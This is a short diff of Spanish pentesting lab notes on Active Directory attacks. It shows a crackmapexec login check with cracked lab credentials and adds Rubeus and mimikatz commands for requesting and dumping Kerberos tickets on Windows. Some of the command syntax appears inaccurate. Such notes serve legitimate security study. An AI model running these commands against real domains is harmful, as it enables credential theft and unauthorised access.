@@ -33,3 +33,10 @@ adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLeg
 
 #### Chequear cuenta post crackeo
 - `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!`
+
+
+## Extraer tickets desde Windows
+- `Rubeus.exe asktgt /user:<usuario> /rc4:<contraseña>`
+- `Rubeus.exe tgtreq /user:<usuario> /rc4:<spn>`
+- `Rubeus tgtdeleg /ticket:<ticket_file>`
+    - mimikatz: `mimikatz.exe "kerberos::list" "exit"`
